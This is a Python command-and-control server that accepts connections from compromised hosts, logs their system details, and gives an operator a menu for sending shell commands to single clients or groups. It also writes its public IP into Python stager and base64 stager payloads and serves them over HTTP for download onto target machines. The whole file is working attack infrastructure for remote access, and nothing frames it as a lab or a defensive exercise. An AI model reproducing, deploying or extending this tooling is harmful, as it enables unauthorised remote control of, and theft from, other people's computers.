import http.server
import socketserver
import threading
import socket
import json
import os
import logging
import urllib.request
import base64  # import for b64 encoding for the b64 stager

# Correct path to configuration file
config_path = os.path.join(os.path.dirname(__file__), 'config', 'config.json')
with open(config_path) as config_file:
    config = json.load(config_file)

# Fetch public IP address
def get_public_ip():
    try:
        public_ip = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
        return public_ip
    except Exception as e:
        logging.error(f"Error fetching public IP: {e}")
        return None

LOCAL_HOST = "0.0.0.0"  # Bind to all available interfaces
PUBLIC_HOST = get_public_ip() if config['server_host'] == '0.0.0.0' else config['server_host']
PORT = config['server_port']
LOG_FILE = config['log_file']
PAYLOAD_FILENAME = config['payload_filename']
HTTP_PORT = config.get('http_port', 80)  # Default to port 80 if not specified

# Configure logging
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(message)s')

# Store connected clients and their numeric IDs
clients = {}
client_groups = {}
client_id_counter = 1
client_id_map = {}

def handle_client(client_socket, addr):
    global client_id_counter
    with client_socket:
        client_id = f"{addr[0]}:{addr[1]}"
        numeric_id = client_id_counter
        client_id_counter += 1

        # Assign the numeric ID to the client
        clients[numeric_id] = client_socket
        client_id_map[numeric_id] = client_id
        
        try:
            system_info = client_socket.recv(4096).decode('utf-8')
            logging.info(f"Connected to {client_id}")
            logging.info(f"System Information from {client_id}:\n{system_info}")
            print(f"[*] System Information from {client_id}:\n{system_info}")
            
            while True:
                command = client_socket.recv(1024).decode('utf-8')
                if command.lower() == 'exit':
                    print(f"[*] Client {numeric_id} has exited.")
                    break
                elif command:
                    response = os.popen(command).read()
                    client_socket.sendall(response.encode())
        except Exception as e:
            logging.error(f"Error handling client {numeric_id}: {e}")
            print(f"[!] Error: {e}")
        finally:
            del clients[numeric_id]
            del client_id_map[numeric_id]
            client_socket.close()
            logging.info(f"Connection to {numeric_id} closed")

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((LOCAL_HOST, PORT))
    server.listen(5)
    print(f"[*] Listening on {LOCAL_HOST}:{PORT}")

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_handler.start()

def base64_encode(string):
    return base64.b64encode(string.encode('utf-8')).decode('utf-8')

def update_client_file():
    files_to_update = [
        os.path.join(os.path.dirname(__file__), 'Stagers', 'c2_client.py'),
        os.path.join(os.path.dirname(__file__), 'Stagers', 'python_stager.py'),
        os.path.join(os.path.dirname(__file__), 'Stagers', 'py_b64_stager.py')
    ]

    base64_public_host = base64_encode(f"http://{PUBLIC_HOST}/c2_client.py")
    
    search_replace_pairs = {
        'c2_client.py': ("SERVER_HOST = '1.1.1.1'", f"SERVER_HOST = '{PUBLIC_HOST}'"),
        'python_stager.py': ("http://1.1.1.1/c2_client.py", f"http://{PUBLIC_HOST}/c2_client.py"),
        'py_b64_stager.py': ("encoded_url = 'insert_base64_url'", f"encoded_url = '{base64_public_host}'")
    }
    
    for file_path in files_to_update:
        filename = os.path.basename(file_path)
        if filename not in search_replace_pairs:
            print(f"[!] No replacement rules found for {filename}.")
            continue

        search_string, replace_string = search_replace_pairs[filename]

        if not os.path.isfile(file_path):
            print(f"[!] Payload file not found: {file_path}")
            continue

        try:
            with open(file_path, 'r') as file:
                content = file.read()
            if search_string not in content:
                print(f"[!] Search string '{search_string}' not found in the file {file_path}.")
                continue

            updated_content = content.replace(search_string, replace_string)
            with open(file_path, 'w') as file:
                file.write(updated_content)
            print(f"[*] Updated {file_path} with server IP: {PUBLIC_HOST}")
        except Exception as e:
            print(f"[!] Error processing file {file_path}: {e}")

def start_http_server():
    payload_path = os.path.join(os.path.dirname(__file__), 'Stagers', PAYLOAD_FILENAME)
    if not os.path.isfile(payload_path):
        print(f"[!] Payload file not found: {payload_path}")
        return

    os.chdir(os.path.dirname(payload_path))
    handler = http.server.SimpleHTTPRequestHandler

    class CustomHTTPRequestHandler(handler):
        def handle_one_request(self):
            try:
                super().handle_one_request()
            except Exception as e:
                logging.error(f"Request handling error: {e}")
                self.send_error(400, "Bad request")

    try:
        httpd = socketserver.TCPServer(("", HTTP_PORT), CustomHTTPRequestHandler)
        print(f"[*] Starting HTTP server on port {HTTP_PORT}")
        httpd.serve_forever()
    except Exception as e:
        logging.error(f"HTTP server error: {e}")

def show_menu():
    while True:
        print("\n--- C2 Server Menu ---")
        print("1. List active connections")
        print("2. Interact with a client")
        print("3. Create client group")
        print("4. List client groups")
        print("5. Interact with a client group")
        print("6. Exit")
        choice = input("Enter your choice: ")

        if choice == '1':
            list_connections()
        elif choice == '2':
            interact_with_client()
        elif choice == '3':
            create_client_group()
        elif choice == '4':
            list_client_groups()
        elif choice == '5':
            interact_with_client_group()
        elif choice == '6':
            break
        else:
            print("[!] Invalid choice. Please select a valid option.")

def list_connections():
    print("\n--- Active Connections ---")
    for numeric_id, client_socket in clients.items():
        print(f"ID {numeric_id}: {client_id_map[numeric_id]}")

def interact_with_client():
    try:
        numeric_id = int(input("Enter the client ID to interact with: "))
        if numeric_id in clients:
            client_socket = clients[numeric_id]
            while True:
                command = input(f"{numeric_id}> ")
                if command.lower() == 'exit':
                    break
                client_socket.sendall(command.encode())
                response = client_socket.recv(4096).decode('utf-8')
                print(response)
        else:
            print(f"[!] No active connection with ID: {numeric_id}")
    except ValueError:
        print("[!] Invalid ID format. Please enter a numeric ID.")

def create_client_group():
    group_name = input("Enter the group name: ")
    client_ids = input("Enter the client IDs to add to the group (comma-separated): ").split(',')
    client_groups[group_name] = [int(client_id.strip()) for client_id in client_ids if client_id.strip().isdigit() and int(client_id.strip()) in clients]
    print(f"[*] Created group '{group_name}' with clients: {client_groups[group_name]}")

def list_client_groups():
    print("\n--- Client Groups ---")
    for group_name, client_list in client_groups.items():
        print(f"{group_name}: {client_list}")

def interact_with_client_group():
    group_name = input("Enter the group name to interact with: ")
    if group_name in client_groups:
        while True:
            command = input(f"{group_name}> ")
            if command.lower() == 'exit':
                break
            for numeric_id in client_groups[group_name]:
                if numeric_id in clients:
                    client_socket = clients[numeric_id]
                    client_socket.sendall(command.encode())
                    response = client_socket.recv(4096).decode('utf-8')
                    print(f"ID {numeric_id}: {response}")
    else:
        print(f"[!] No group with name: {group_name}")

if __name__ == "__main__":
    # Update client files before starting the servers
    update_client_file()

    listener_thread = threading.Thread(target=start_listener)
    listener_thread.daemon = True
    listener_thread.start()

    http_thread = threading.Thread(target=start_http_server)
    http_thread.daemon = True
    http_thread.start()

    show_menu()
